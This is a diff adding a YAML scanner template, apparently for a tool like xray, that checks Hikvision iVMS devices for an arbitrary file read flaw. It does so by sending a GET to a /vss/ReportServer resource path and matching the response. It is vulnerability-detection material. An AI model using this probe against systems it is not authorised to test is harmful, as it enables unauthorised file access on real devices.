@@ -1,0 +1,18 @@
+id: hikvision-ivms-fileread
+
+info:
+  name: hikvision ivms fileread
+  author: qwtd
+  severity: high
+  verified: true
+  description: |
+    海康威视ivms某接口存在任意文件读取漏洞，攻击者利用该漏洞可以浏览目录及读取服务端文件内容。
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /vss/ReportServer?op=resource&resource=/com/
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b'hikvision')
+expression: r0()
